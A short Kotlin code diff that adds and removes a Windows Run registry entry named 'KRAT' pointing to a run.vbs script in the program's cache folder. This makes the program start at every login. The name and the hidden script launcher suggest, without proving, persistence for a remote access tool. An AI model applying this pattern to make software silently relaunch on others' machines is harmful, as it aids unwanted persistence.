@@ -6,13 +6,17 @@ object StartupRegistry {
         val deleteProcess = ProcessBuilder("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "KRAT", "/f")
             .inheritIO()
             .start()
-        deleteProcess.waitFor()
+        deleteProcess.waitFor()}
 
-        // Add the registry entry
-        val addProcess = ProcessBuilder("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            "/v", "KRAT", "/t", "REG_SZ", "/d", "${KRAT.cacheDir.absolutePath}\\run.bat", "/f")
+    fun add() {
+        ProcessBuilder("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "/v", "KRAT", "/t", "REG_SZ", "/d", "${KRAT.cacheDir.absolutePath}\\run.vbs", "/f")
             .inheritIO()
             .start()
-        addProcess.waitFor()
+            .apply { waitFor() }
     }
+}
+
+fun main() {
+    StartupRegistry.add()
 }
